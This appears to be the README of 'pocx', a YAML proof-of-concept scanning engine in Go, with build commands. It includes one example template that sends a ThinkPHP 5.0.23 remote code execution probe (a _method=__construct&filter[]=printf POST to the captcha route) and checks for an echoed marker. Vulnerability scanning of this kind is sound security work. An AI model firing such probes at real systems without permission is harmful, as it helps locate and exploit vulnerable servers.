# pocx

一个完善的 yaml poc 引擎，poc 定义在wiki中

使用方法参考 _example/main.go

## 未实现

- 部分表达式函数
- toUintString // expression/expr.go
- TCP/UDP 的 yaml 实现
- Python 等语言的集成


# pocx发版记录
 * v2.0 增加rmi协议支持

## linux 交叉编译
```base
CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -o pocx_mac_623 main.go
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -o pocx_windows_623.exe main.go
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o pocx_linux _623 main.go
```

```yaml
id: 19b92bc4-9d03-4394-8f50-5c2ef3a05d36
name: thinkphp-5023-rce
tags:
    - thinkphp
transport: http
needreverse: false
set:
    v: randomLowercase(8)
rules:
    r0:
        request:
            body: _method=__construct&filter[]=printf&method=get&server[REQUEST_METHOD]={{v}}
            cache: false
            follow_redirects: false
            headers:
                Content-Type: application/x-www-form-urlencoded
            method: POST
            path: /index.php?s=captcha
        expression: response.status == 200 && response.body.bcontains(bytes(v))
        output: null
expression: r0()
detail:
    fingerprint:
        softhard: ""
        name: ""
        company: ""
        category: ""
        parent_category: ""
    vulnerability:
        author: ""
        links: ""
        severity: ""
        description: ""
        proof: {}

```